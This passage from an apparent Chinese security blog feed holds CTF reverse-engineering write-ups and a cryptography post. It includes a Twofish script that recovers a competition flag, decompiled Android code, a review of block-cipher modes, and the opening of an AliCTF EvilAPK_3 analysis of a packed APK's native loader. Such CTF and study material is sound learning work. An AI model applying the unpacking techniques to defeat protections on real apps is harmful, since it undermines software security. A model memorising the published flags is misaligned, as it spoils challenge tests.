name=&quot;yes&quot;&gt;    Yes! You got me! :)&lt;/string&gt;&lt;/resources&gt;</code></pre><p>最后找个库实现一下解密：</p><pre><code class="python">#!/usr/bin/env pythonfrom twofish import Twofishciphertext = [0x88, 0x4D, 0xF2, 0xDA, 0x11, 0x05, 0xD6, 0x2C, 0xE0, 0x6D, 0x55, 0x1F, 0x18, 0xA5, 0x90, 0xAD, 0x40, 0xAD, 0x80, 0x54, 0x05, 0xA2, 0x9E, 0xE2, 0x12, 0x46, 0xE6, 0x47, 0x05, 0x9D, 0xC2, 0xC6, 0x75, 0x1D, 0xD4, 0x06, 0x70, 0xFC, 0x51, 0x54, 0x09, 0x16, 0xCD, 0x5F, 0xDE, 0x0C, 0x2F, 0x4D]ciphertext = &#39;&#39;.join([chr(c) for c in ciphertext])T = Twofish(&#39;I have a male fish and a female &#39;)flag = &#39;&#39;for i in range(0, 48, 16):    flag += T.decrypt(ciphertext[i:i+16])print flag# qwb{TH3y_Io&lt;e_EACh_OTh3r_FOrEUER}</code></pre><h1 id="你是谁"><a href="#你是谁" class="headerlink" title="你是谁"></a>你是谁</h1><p>TODO:</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;xyz.konso.testsrtp&quot; platformBuildVersionCode=&quot;23&quot; platformBuildVersionName=&quot;6.0-2166767&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;15&quot; android:targetSdkVersion=&quot;23&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.CHANGE_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.BROADCAST_STICKY&quot; /&gt;    注：部分手机如无此权限会报错    &lt;uses-permission android:name=&quot;android.permission.BLUETOOTH&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.MODIFY_AUDIO_SETTINGS&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/icon&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot;&gt;        &lt;activity android:name=&quot;xyz.konso.testsrtp.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.view&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;xyz.konso.testsrtp.SplashActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><pre><code class="java">package xyz.konso.testsrtp;import android.app.Activity;import android.content.Intent;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.os.Handler;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.widget.TextView;public class SplashActivity extends Activity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        getWindow().setFlags(AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT, AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT);        setContentView(R.layout.activity_splash);        try {            ((TextView) findViewById(R.id.versionNumber)).setText(&quot;Version &quot; + getPackageManager().getPackageInfo(&quot;com.lyt.android&quot;, 0).versionName);        } catch (NameNotFoundException e) {            e.printStackTrace();        }        new Handler().postDelayed(new Runnable() {            public void run() {                SplashActivity.this.startActivity(new Intent(SplashActivity.this, MainActivity.class));                SplashActivity.this.finish();            }        }, 2500);    }}</code></pre><pre><code class="java">package xyz.konso.testsrtp;import android.app.Activity;import android.media.AudioManager;import android.os.Bundle;import android.util.Log;import android.widget.Button;import android.widget.Toast;import com.iflytek.cloud.InitListener;import com.iflytek.cloud.RecognizerListener;import com.iflytek.cloud.RecognizerResult;import com.iflytek.cloud.SpeechConstant;import com.iflytek.cloud.SpeechError;import com.iflytek.cloud.SpeechRecognizer;import com.iflytek.cloud.SpeechSynthesizer;import com.iflytek.cloud.SpeechUtility;import com.iflytek.cloud.SynthesizerListener;import org.json.JSONObject;public class MainActivity extends Activity {    private String TAG = &quot;shitou&quot;;    private Button button1;    private Button button2;    private AudioManager mAudioManager;    private SpeechRecognizer mIat;    private InitListener mInitListener = new InitListener() {        public void onInit(int code) {            Log.d(MainActivity.this.TAG, &quot;SpeechRecognizer init() code = &quot; + code);        }    };    private SynthesizerListener mSynListener = new SynthesizerListener() {        public void onCompleted(SpeechError error) {        }        public void onBufferProgress(int percent, int beginPos, int endPos, String info) {        }        public void onSpeakBegin() {            Log.d(MainActivity.this.TAG, &quot;speakcheck&quot;);        }        public void onSpeakPaused() {        }        public void onSpeakProgress(int percent, int beginPos, int endPos) {        }        public void onSpeakResumed() {        }        public void onEvent(int arg0, int arg1, int arg2, Bundle arg3) {        }    };    private SpeechSynthesizer mTts;    private RecognizerListener recognizerListener = new RecognizerListener() {        public void onBeginOfSpeech() {        }        public void onError(SpeechError error) {        }        public void onEndOfSpeech() {        }        public void onResult(RecognizerResult results, boolean isLast) {            Log.d(MainActivity.this.TAG, results.getResultString());            try {                MainActivity.this.ss = new JSONObject(results.getResultString()).getJSONArray(&quot;ws&quot;).getJSONObject(0).getJSONArray(&quot;cw&quot;).getJSONObject(0).getString(&quot;w&quot;);            } catch (Exception e) {                Log.d(MainActivity.this.TAG, &quot;catch Excepetion&quot;);            }            if (MainActivity.this.ss.equals(&quot;\u4f60\u597d&quot;)) { // 你好                MainActivity.this.getsna();            }            Log.d(MainActivity.this.TAG, MainActivity.this.ss);        }        public void onVolumeChanged(int volume, byte[] var2) {        }        public void onEvent(int eventType, int arg1, int arg2, Bundle obj) {        }    };    private JSONObject res;    private String ss;    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(new background(this));        this.mAudioManager = (AudioManager) getSystemService(&quot;audio&quot;);        this.mAudioManager.setBluetoothScoOn(true);        this.mAudioManager.startBluetoothSco();        SpeechUtility.createUtility(this, &quot;appid=561e6833&quot;);        this.mIat = SpeechRecognizer.createRecognizer(this, this.mInitListener);        this.mTts = SpeechSynthesizer.createSynthesizer(this, null);    }    public void setParam() {        this.mIat.setParameter(SpeechConstant.DOMAIN, &quot;iat&quot;);        this.mIat.setParameter(SpeechConstant.LANGUAGE, &quot;zh_cn&quot;);        this.mIat.setParameter(SpeechConstant.ACCENT, &quot;mandarin&quot;);    }    public void getsna() {        Toast.makeText(this, &quot;haha&quot;, 0).show();    }    protected void onDestroy() {        super.onDestroy();        this.mAudioManager.setBluetoothScoOn(false);        this.mAudioManager.stopBluetoothSco();    }}</code></pre><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *vm){  jclass v2; // r4  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = 0;  if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65540) )    return -1;  if ( byte_FF45C )    _android_log_write(3, &quot;MSC_LOG&quot;, &quot;JNI_OnLoad is called !&quot;);  v2 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, &quot;java/io/FileDescriptor&quot;);  if ( !v2 &amp;&amp; byte_FF45C )    _android_log_write(3, &quot;MSC_LOG&quot;, &quot;Unable to find Java class java.io.FileDescriptor&quot;);  dword_FFC14 = (int)env-&gt;functions-&gt;GetFieldID(&amp;env-&gt;functions, v2, &quot;descriptor&quot;, &quot;I&quot;);  if ( dword_FFC14 || !byte_FF45C )             // get descriptor in FileDescriptor and judge    return 65540;  _android_log_write(3, &quot;MSC_LOG&quot;, &quot;Unable to find descriptor field in java.io.FileDescriptor&quot;);  return 65540;}</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.jianshu.com/p/a2f826064e29" target="_blank" rel="noopener">https://www.jianshu.com/p/a2f826064e29</a><br><a href="https://blog.csdn.net/jscese/article/details/51005447" target="_blank" rel="noopener">https://blog.csdn.net/jscese/article/details/51005447</a><br><a href="https://blog.csdn.net/zhuzhuzhu22/article/details/80306203" target="_blank" rel="noopener">https://blog.csdn.net/zhuzhuzhu22/article/details/80306203</a><br><a href="https://blog.csdn.net/ldpxxx/article/details/9253369" target="_blank" rel="noopener">https://blog.csdn.net/ldpxxx/article/details/9253369</a><br><a href="https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex" target="_blank" rel="noopener">https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex</a><br><a href="https://www.52pojie.cn/thread-1105062-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1105062-1-1.html</a><br><a href="https://blog.csdn.net/jason0539/article/details/10049899" target="_blank" rel="noopener">https://blog.csdn.net/jason0539/article/details/10049899</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;持续更新。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>分组密码的工作模式</title>
    <link href="blog.b3ale.cn/2020/02/17/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
    <id>blog.b3ale.cn/2020/02/17/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</id>
    <published>2020-02-17T14:30:05.000Z</published>
    <updated>2020-03-20T02:48:01.961Z</updated>
    
    <content type="html"><![CDATA[<p>复习一下密码学。</p><a id="more"></a><h1 id="分组密码的工作模式简介"><a href="#分组密码的工作模式简介" class="headerlink" title="分组密码的工作模式简介"></a>分组密码的工作模式简介</h1><p>密码学中，区块（block）密码的工作模式（mode of operation）允许使用同一个区块密码密钥对多于一块的数据进行加密，并保证其安全性。区块密码自身只能加密长度等于密码区块长度的单块数据，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到符合密码块大小的长度。一种工作模式描述了加密每一数据块的过程，并常常使用基于一个通常称为初始化向量的附加输入值以进行随机化，以保证安全。</p><p>工作模式主要用来进行加密和认证。对加密模式的研究曾经包含数据的完整性保护，即在某些数据被修改后的情况下密码的误差传播特性。后来的研究则将完整性保护作为另一个完全不同的，与加密无关的密码学目标。部分现代的工作模式用有效的方法将加密和认证结合起来，称为认证加密模式。</p><p>虽然工作模式通常应用于对称加密，它亦可以应用于公钥加密，例如在原理上对 RSA 进行处理，但在实用中，公钥密码学通常不用于加密较长的信息，而是使用结合对称加密和公钥加密的混合加密方案。</p><h1 id="初始化向量（IV）"><a href="#初始化向量（IV）" class="headerlink" title="初始化向量（IV）"></a>初始化向量（IV）</h1><p>初始化向量（IV，Initialization Vector）是许多工作模式中用于将加密随机化的一个位块，由此即使同样的明文被多次加密也会产生不同的密文，避免了较慢的重新产生密钥的过程。</p><p>初始化向量与密钥相比有不同的安全性需求，因此 IV 通常无须保密，然而在大多数情况中，不应当在使用同一密钥的情况下两次使用同一个 IV。对于 CBC 和 CFB，重用 IV 会导致泄露明文首个块的某些信息，亦包括两个不同消息中相同的前缀。对于 OFB 和 CTR 而言，重用 IV 会导致完全失去安全性。另外，在 CBC 模式中，IV 在加密时必须是无法预测的；特别的，在许多实现中使用的产生 IV 的方法，例如 SSL2.0 使用的，即采用上一个消息的最后一块密文作为下一个消息的 IV，是不安全的。</p><h1 id="填充（padding）"><a href="#填充（padding）" class="headerlink" title="填充（padding）"></a>填充（padding）</h1><p>块密码只能对确定长度的数据块进行处理，而消息的长度通常是可变的。因此部分模式（即 ECB 和 CBC）需要最后一块在加密前进行填充。有数种填充方法，其中最简单的一种是在明文的最后填充空字符以使其长度为块长度的整数倍，但必须保证可以恢复明文的原始长度；例如，若明文是 C 语言风格的字符串，则只有串尾会有空字符。稍微复杂一点的方法则是原始的 DES 使用的方法，即在数据后添加一个 1 位，再添加足够的 0 位直到满足块长度的要求；若消息长度刚好符合块长度，则添加一个填充块。最复杂的则是针对 CBC 的方法，例如密文窃取，残块终结等，不会产生额外的密文，但会增加一些复杂度。布鲁斯·施奈尔和尼尔斯·弗格森提出了两种简单的可能性：添加一个值为 128 的字节（十六进制的 80），再以 0 字节填满最后一个块；或向最后一个块填充 n 个值均为 n 的字节。</p><p>CFB，OFB 和 CTR 模式不需要对长度不为密码块大小整数倍的消息进行特别的处理。因为这些模式是通过对块密码的输出与明文进行异或工作的。最后一个明文块（可能是不完整的）与密钥流块的前几个字节异或后，产生了与该明文块大小相同的密文块。流密码的这个特性使得它们可以应用在需要密文和明文数据长度严格相等的场合，也可以应用在以流形式传输数据而不便于进行填充的场合。</p><h1 id="常用模式"><a href="#常用模式" class="headerlink" title="常用模式"></a>常用模式</h1><h2 id="电子密码本（ECB）"><a href="#电子密码本（ECB）" class="headerlink" title="电子密码本（ECB）"></a>电子密码本（ECB）</h2><p>最简单的加密模式即为电子密码本（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。</p><p><img src="/pics/分组密码的工作模式/1.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/2.png" srcset="/img/loading.gif" alt></p><p>ECB 的缺点在于同样的明文块会被加密成相同的密文块，因此它不能很好的隐藏数据模式。在某些场合，这种方法不能提供严格的数据保密性，因此并不推荐用于密码协议中。</p><p>ECB 模式也会导致使用它的协议不能提供数据完整性保护，易受到重放攻击的影响，因此每个块是以完全相同的方式解密的。例如，“梦幻之星在线：蓝色脉冲”在线电子游戏使用 ECB 模式的 Blowfish 密码。在密钥交换系统被破解而产生更简单的破解方式前，作弊者重复通过发送加密的“杀死怪物”消息包以非法的快速增加经验值。</p><h2 id="密码块链接（CBC）"><a href="#密码块链接（CBC）" class="headerlink" title="密码块链接（CBC）"></a>密码块链接（CBC）</h2><p>1976 年，IBM 发明了密码分组链接（CBC，Cipher-block chaining）模式。在 CBC 模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p><p><img src="/pics/分组密码的工作模式/3.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/4.png" srcset="/img/loading.gif" alt></p><p>若第一个块的下标为 1，则 CBC 模式的加密过程如下：</p><p>$$<br>C_i = E_K(P_i \oplus IV) \\<br>IV = C_i<br>$$</p><p>其解密过程如下：</p><p>$$<br>P_i = D_K(C_i) \oplus IV \\<br>IV = C_i<br>$$</p><p>CBC 是最为常用的工作模式。它的主要缺点在于加密过程是串行的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。</p><p>注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。</p><h2 id="填充密码块链接（PCBC）"><a href="#填充密码块链接（PCBC）" class="headerlink" title="填充密码块链接（PCBC）"></a>填充密码块链接（PCBC）</h2><p>填充密码块链接（PCBC，Propagating cipher-block chaining）或称为明文密码块链接（Plaintext cipher-block chaining），是一种可以使密文中的微小更改在解密时导致明文大部分错误的模式，并在加密的时候也具有同样的特性。</p><p><img src="/pics/分组密码的工作模式/5.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/6.png" srcset="/img/loading.gif" alt></p><p>PCBC 的加密过程如下：</p><p>$$<br>C_i = E_K(P_i \oplus IV) \\<br>IV = P_i \oplus C_i<br>$$</p><p>其解密过程如下：</p><p>$$<br>P_i = D_K(C_i) \oplus IV \\<br>IV = P_i \oplus C_i<br>$$</p><p>PCBC 主要用于 Kerberos v4 和 WASTE 中，而在其它场合的应用较少。对于使用 PCBC 加密的消息，互换两个邻接的密文块不会对后续块的解密造成影响。正因为这个特性，Kerberos v5 没有使用 PCBC。</p><h2 id="密文反馈（CFB）"><a href="#密文反馈（CFB）" class="headerlink" title="密文反馈（CFB）"></a>密文反馈（CFB）</h2><p>密文反馈（CFB，Cipher feedback）模式类似于 CBC，可以将块密码变为自同步的流密码；工作过程亦非常相似，CFB 的解密过程几乎就是颠倒的 CBC 的加密过程：</p><p>$$<br>C_i = E_K(IV \oplus P_i) \\<br>P_i = E_K(IV \oplus C_i) \\<br>IV = C_i<br>$$</p><p><img src="/pics/分组密码的工作模式/7.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/8.png" srcset="/img/loading.gif" alt></p><p>上述公式是描述的是最简单的 CFB，在这种模式下，它的自同步特性仅仅与 CBC 相同，即若密文的一整块发生错误，CBC 和 CFB 都仍能解密大部分数据，而仅有一位数据错误。若需要在仅有了一位或一字节错误的情况下也让模式具有自同步性，必须每次只加密一位或一字节。可以将移位寄存器作为块密码的输入，以利用 CFB 的自同步性。</p><p>为了利用 CFB 制作一种自同步的，可以处理任意位情况错误的流密码，需要使用一个与块的大小相同的移位寄存器，并用 IV 将寄存器初始化。然后，将寄存器内容使用块密码加密，然后将结果的最高 $x$ 位与明文的 $x$ 进行异或，以产生密文的 $x$ 位。下一步将生成的 $x$ 位密文移入寄存器中，并对下面的 $x$ 位明文重复这一过程。解密过程与加密过程相似，以 IV 开始，对寄存器加密，将结果的高 $x$ 与密文异或，产生 $x$ 位明文，再将密文的下面 $x$ 位移入寄存器。</p><p>下式中 $S_i$ 是移位寄存器的第 $i$ 个状态，$a \ll x$ 是指将 $a$ 移位 $x$ 位，$head(a, x)$ 是指 $a$ 的高 $x$ 位，$n$ 则是指 IV 的位数。</p><p>$$<br>C_i = head(E_K(S_{i-1}), x) \oplus P_i \\<br>P_i = head(E_K(S_{i-1}), x) \oplus C_i \\<br>S_i = ((S_{i-1} \ll x) + C_i) mod\ 2^n \\<br>IV = S_i<br>$$</p><p>若密文的 $x$ 位发生错误，则密码在移位寄存器恢复与加密时的状态相同之前，输出不正确的结果，而当寄存器状态恢复后，密码即可以重新同步，恢复正常输出，因此最多只有一块数据发生错误。</p><p>与 CBC 相似，明文的改变会影响接下来所有的密文，因此加密过程不能并行化；而同样的，与 CBC 类似，解密过程是可以并行化的。在解密时，密文中一位数据的改变仅会影响两个明文块：对应明文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。</p><p>CFB 拥有一些 CBC 所不具备的特性，这些特性与 OFB 和 CTR 的流模式相似：只需要使用块密码进行加密操作，且消息无需进行填充（虽然密文窃取也允许数据不进行填充）。</p><h2 id="输出反馈（OFB）"><a href="#输出反馈（OFB）" class="headerlink" title="输出反馈（OFB）"></a>输出反馈（OFB）</h2><p>输出反馈模式（Output feedback, OFB）可以将块密码变成同步的流密码。它产生密钥流的块，然后将其与明文块进行异或，得到密文。与其它流密码一样，密文中一个位的翻转会使明文中同样位置的位也产生翻转。这种特性使得许多错误校正码，例如奇偶校验位，即使在加密前计算，而在加密后进行校验也可以得出正确结果。</p><p>由于 XOR 操作的对称性，加密和解密操作是完全相同的：</p><p>$$<br>C_i = P_i \oplus O_i \\<br>P_i = C_i \oplus O_i \\<br>O_i = E_K(O_{i-1}) \\<br>IV = O_i<br>$$</p><p><img src="/pics/分组密码的工作模式/9.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/10.png" srcset="/img/loading.gif" alt></p><p>每个使用 OFB 的输出块与其前面所有的输出块相关，因此不能并行化处理。然而，由于明文和密文只在最终的异或过程中使用，因此可以事先对 IV 进行加密，最后并行的将明文或密文进行并行的异或处理。</p><p>可以利用输入全 0 的 CBC 模式产生 OFB 模式的密钥流。这种方法十分实用，因为可以利用快速的 CBC 硬件实现来加速 OFB 模式的加密过程。</p><h2 id="计数器模式（CTR）"><a href="#计数器模式（CTR）" class="headerlink" title="计数器模式（CTR）"></a>计数器模式（CTR）</h2><p>PS：CTR 模式（Counter mode，CM）也被称为 ICM 模式（Integer Counter Mode，整数计数模式）和 SIC 模式（Segmented Integer Counter）。</p><p>与 OFB 相似，CTR 将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。使用简单的、定义好的输入函数是有争议的：批评者认为它“有意的将密码系统暴露在已知的、系统的输入会造成不必要的风险”。目前，CTR 已经被广泛的使用了，由输入函数造成的问题被认为是使用的块密码的缺陷，而非 CTR 模式本身的弱点。无论如何，有一些特别的攻击方法，例如基于使用简单计数器作为输入的硬件差错攻击。</p><p>CTR 模式的特征类似于 OFB，但它允许在解密时进行随机存取。由于加密和解密过程均可以进行并行处理，CTR 适合运用于多处理器的硬件上。</p><p>注意图中的“nonce”与其它图中的 IV（初始化向量）相同。IV、随机数和计数器均可以通过连接，相加或异或使得相同明文产生不同的密文。</p><p><img src="/pics/分组密码的工作模式/11.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/12.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复习一下密码学。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="crypto" scheme="blog.b3ale.cn/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2014-AliCTF-EvilAPK_3</title>
    <link href="blog.b3ale.cn/2020/02/15/2014-AliCTF-EvilAPK_3/"/>
    <id>blog.b3ale.cn/2020/02/15/2014-AliCTF-EvilAPK_3/</id>
    <published>2020-02-15T11:41:35.000Z</published>
    <updated>2020-03-20T01:52:10.549Z</updated>
    
    <content type="html"><![CDATA[<p>接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。</p><a id="more"></a><h1 id="Analysis（classes-dex）"><a href="#Analysis（classes-dex）" class="headerlink" title="Analysis（classes.dex）"></a>Analysis（classes.dex）</h1><p>这道题目是阿里 14 年出的，先导入 jadx 看看反编译后大概的内容。在 AndroidManifest.xml 中，可以看到先设置了入口点为 com.ali.mobisecenhance.StubApplication，猜测这里可能是阿里加固自己添加的一个入口，用来执行一些初始化的操作，比如解密 dex，反调试，检测模拟器等等之类的。调用完 StubApplication 后，才会调用 MainActivity：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.ali.tg.testapp&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;8&quot; android:targetSdkVersion=&quot;9&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@drawable/ic_launcher&quot; android:name=&quot;com.ali.mobisecenhance.StubApplication&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot;&gt;        &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;.WebViewActivity&quot; /&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>在反编译出来的 Java 文件中，只能找到一个 StubApplication 类，其中的函数都是在 Native 层所实现，且加载了一个 mobisec 库。一般程序中是先执行 onCreate 函数，但 attachBaseContext 函数会早于 onCreate 函数执行：</p><pre><code class="java">package com.ali.mobisecenhance;import android.app.Application;import android.content.Context;public class StubApplication extends Application {    private native void b(ClassLoader classLoader, Context context);    protected native void attachBaseContext(Context context);    public native void onCreate();    static {        System.loadLibrary(&quot;mobisec&quot;);    }}</code></pre><p>可以在 lib 文件夹下看到 libmobisec.so 库，同时还可以看到在 assets 文件夹中有两个 jar 文件：</p><pre><code class="bash">$ tree ..├── AndroidManifest.xml├── META-INF│   ├── MANIFEST.MF│   ├── TEST.RSA│   └── TEST.SF├── assets│   ├── cls.jar│   └── fak.jar├── classes.dex├── lib│   ├── armeabi│   │   ├── libhack.so│   │   ├── libmobisec.so│   │   └── libtranslate.so│   ├── armeabi-v7a│   │   ├── libhack.so│   │   ├── libmobisec.so│   │   └── libtranslate.so│   └── x86│       ├── libhack.so│       ├── libmobisec.so│       └── libtranslate.so├── res│   ├── drawable-hdpi│   │   ├── android.jpg│   │   └── android1.jpg│   ├── drawable-mdpi│   │   └── ic_launcher.png│   ├── drawable-xhdpi│   │   └── ic_launcher.png│   ├── drawable-xxhdpi│   │   └── ic_launcher.png│   └── layout│       ├── activity_main.xml│       └── webviewlayout.xml└── resources.arsc12 directories, 24 files</code></pre><p>file 一下，发现是 cls.jar 是一段不可识别的数据，fak.jar 判断出来是个 zip 文件：</p><pre><code class="bash">$ file cls.jarcls.jar: data$ file fak.jarfak.jar: Zip archive data, at least v?[0x314] to extract</code></pre><p>经过以上粗略的审计，可以猜测可能是在 libmobisec.so 实现了 StubApplication 中的函数，并对 assets 文件夹下的两个文件进行操作来还原出 MainActivity 中的函数。</p><h1 id="Analysis（libmobisec-so）"><a href="#Analysis（libmobisec-so）" class="headerlink" title="Analysis（libmobisec.so）"></a>Analysis（libmobisec.so）</h1><p>打开 IDA，最先定位到 JNI_OnLoad 函数，查看一下注册了哪些函数：</p><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *vm, int a2){  const char *v2; // r2  jclass v3; // r1  signed int result; // r0  bool v5; // zf  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = (_JNIEnv *)a2;  if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65542) )  {    v2 = &quot;Failed to get the environment&quot;;LABEL_5:    _android_log_print(6, &quot;debug&quot;, v2);    return -1;  }  v3 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, &quot;com/ali/mobisecenhance/StubApplication&quot;);// locate class  if ( !v3 )  {    v2 = &quot;failed to get class reference&quot;;    goto LABEL_5;  }  v5 = env-&gt;functions-&gt;RegisterNatives(&amp;env-&gt;functions, v3, (const JNINativeMethod *)gMethods, 2) == 0;// register 2 methods  result = 65542;  if ( !v5 )    result = -1;  return result;}</code></pre><p>在 RegisterNatives 函数的参数中可以看到注册了两个函数，分别为 attachBaseContext 和 onCreate。在内存中可以找到两个函数对应的指针：</p><pre><code>.data:00054010 gMethods        DCD aAttachbasecont_0   ; DATA XREF: JNI_OnLoad+44↑o.data:00054010                                         ; .text:off_24784↑o.data:00054010                                         ; &quot;attachBaseContext&quot;.data:00054014                 DCD aLandroidConten_1   ; &quot;(Landroid/content/Context;)V&quot;.data:00054018                 DCD sub_24D3C+1.data:0005401C                 DCD aOncreate           ; &quot;onCreate&quot;.data:00054020                 DCD aV                  ; &quot;()V&quot;.data:00054024                 DCD sub_24498+1</code></pre><p>因为 attachBaseContext 先于 onCreate 函数执行，这里先看一下 attachBaseContext。跟着 log 可以对函数有一个大体的了解，在一处 log 里有“enter new application”的信息，猜测可能是完成了解码进入 MainActivity。在该处上下看看可以发现一个 parse_dex 函数，很有可能是解析出真正的 dex 文件的函数：</p><pre><code class="cpp">int __fastcall attachBaseContext(_JNIEnv *a1, jobject *a2, jobject *a3){  jobject *v3; // r8  jobject *v4; // r10  _JNIEnv *env; // r4  _JNIEnv *v6; // r1  int v7; // r2  int result; // r0  ali *v9; // r0  int v10; // r0  int v11; // r0  int v12; // r0  int v13; // r5  int v14; // r0  int v15; // r0  int v16; // r0  int v17; // r0  int v18; // r0  char *v19; // r0  int v20; // r0  int v21; // r0  void *v22; // r0  void *v23; // r8  const char *v24; // r0  const char *v25; // r5  size_t v26; // r0  int v27; // r5  int v28; // r8  int v29; // r0  int v30; // r5  const char *v31; // r2  int v32; // r0  ali *v33; // r0  int v34; // r4  unsigned __int64 v35; // r2  int v36; // [sp+8h] [bp-78h]  __int64 v37; // [sp+18h] [bp-68h]  char v38; // [sp+24h] [bp-5Ch]  char 